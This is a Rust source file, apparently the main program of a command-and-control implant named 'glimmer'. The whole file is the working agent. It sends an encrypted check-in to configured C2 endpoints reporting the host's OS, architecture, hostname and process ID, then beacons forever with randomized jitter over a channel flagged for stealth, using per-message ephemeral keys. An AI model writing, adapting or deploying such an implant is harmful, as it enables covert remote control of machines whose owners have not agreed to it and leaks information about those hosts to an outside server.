use glimmer::c2::http::HTTPChannel;
use glimmer::c2::{Channel, SendContext};
use glimmer::cfg::Config;
use glimmer::crypto;
use glimmer::identity;
use glimmer::proto::{CheckinData, Envelope, MsgType};

fn main() {
    let config = match Config::load("config.json") {
        Ok(c) => c,
        Err(e) => {
            eprintln!("config: {}", e);
            std::process::exit(1);
        }
    };

    let node_id = identity::generate();

    let server_pub = match config.server_public_key_bytes() {
        Ok(k) => k,
        Err(e) => {
            eprintln!("invalid server public key: {}", e);
            std::process::exit(1);
        }
    };

    let channel = match HTTPChannel::new(config.c2_endpoints.clone()) {
        Ok(c) => c,
        Err(e) => {
            eprintln!("channel init failed: {}", e);
            std::process::exit(1);
        }
    };

    glimmer::dbg_log!(
        "channel: {} (stealth={}, max={})",
        channel.info().name,
        channel.info().stealth,
        channel.info().max_payload
    );

    // Checkin — ephemeral encryption, request response
    let checkin = CheckinData {
        os: std::env::consts::OS.into(),
        arch: std::env::consts::ARCH.into(),
        host: hostname(),
        pid: std::process::id(),
        pub_key: vec![], // no longer needed — each message has its own ephemeral key
    };

    match send_with_response(
        MsgType::Checkin,
        &node_id,
        Some(&checkin),
        &server_pub,
        &channel,
    ) {
        Ok(Some(_response)) => {
            glimmer::dbg_log!("checkin sent, response: {} bytes", _response.len());
        }
        Ok(None) => {
            eprintln!("[dev] checkin sent, no response");
        }
        Err(e) => {
            eprintln!("[dev] checkin failed: {}", e);
        }
    }

    // Beacon loop — ephemeral encryption, no response needed
    loop {
        match send_no_response(
            MsgType::Beacon,
            &node_id,
            None::<&()>,
            &server_pub,
            &channel,
        ) {
            Ok(_) => eprintln!("[dev] beacon sent"),
            Err(e) => eprintln!("[dev] beacon failed: {}", e),
        }

        sleep(config.beacon_interval(), config.jitter_percent);
    }
}

/// Send a message with per-message ephemeral encryption.
/// No persistent keys — one-time key exists only during this call.
fn send_no_response<T: serde::Serialize>(
    msg_type: MsgType,
    node_id: &str,
    payload: Option<&T>,
    server_pub: &[u8],
    channel: &dyn Channel,
) -> Result<Option<Vec<u8>>, Box<dyn std::error::Error>> {
    let envelope = match payload {
        Some(data) => Envelope::with_data(msg_type, node_id, data)?,
        None => Envelope::new(msg_type, node_id, None),
    };

    let serialized = envelope.marshal()?;

    // Per-message ephemeral encryption — key exists only for this call
    let encrypted = crypto::encrypt_for_server(&serialized, server_pub)?;

    let ctx = SendContext::new(server_pub, node_id, encrypted);
    channel.send(&ctx)
}

/// Send a message and decrypt the response.
/// Two ephemeral keypairs: one for sending (consumed immediately),
/// one for response (consumed when response is decrypted).
fn send_with_response<T: serde::Serialize>(
    msg_type: MsgType,
    node_id: &str,
    payload: Option<&T>,
    server_pub: &[u8],
    channel: &dyn Channel,
) -> Result<Option<Vec<u8>>, Box<dyn std::error::Error>> {
    let envelope = match payload {
        Some(data) => Envelope::with_data(msg_type, node_id, data)?,
        None => Envelope::new(msg_type, node_id, None),
    };

    let serialized = envelope.marshal()?;

    let (encrypted, response_kp) =
        crypto::encrypt_for_server_with_response(&serialized, server_pub)?;

    let ctx = SendContext::new(server_pub, node_id, encrypted);
    let response = channel.send(&ctx)?;

    match response {
        Some(resp_bytes) if !resp_bytes.is_empty() => {
            let decrypted = response_kp.decrypt_response(&resp_bytes, server_pub)?;
            Ok(Some(decrypted))
        }
        _ => {
            // response_kp drops here — private key zeroized even if unused
            drop(response_kp);
            Ok(None)
        }
    }
}

fn sleep(base: std::time::Duration, jitter: f64) {
    let random: f64 = rand::random();
    let j = base.mul_f64(jitter * random);
    std::thread::sleep(base + j);
}

fn hostname() -> String {
    glimmer::sys::read_file_string("/etc/hostname")
        .unwrap_or_else(|_| "unknown".into())
}